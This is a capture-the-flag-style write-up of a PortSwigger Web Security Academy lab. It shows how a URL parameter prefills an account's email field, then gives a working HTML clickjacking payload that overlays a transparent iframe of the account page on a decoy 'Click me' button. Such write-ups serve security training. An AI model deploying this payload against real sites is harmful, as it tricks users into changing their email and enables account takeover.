
# Clickjacking with form input data prefilled from a URL parameter

This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter

Note: The victim will be using Chrome so test your exploit on that browser.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.


---------------------------------------------

References: 

- https://portswigger.net/web-security/clickjacking



![img](images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/1.png)

---------------------------------------------

If the user profile is accessed with the parameter “email”, the email field gets populated:



![img](images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/2.png)


So we can execute the attack with a payload like this:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:600px;
			height:600px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:600px;
			height:600px;
			z-index:1;
			}
		#btn {
			position:absolute;
			top:440px;
			left:70px;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button id="btn">Click me</button>
	</div>
	<iframe id="target_website" src="https://0a11003f031a6dc080b6033a0090001e.web-security-academy.net/my-account?email=test@test.com">
	</iframe>
</body>
```



![img](images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/3.png)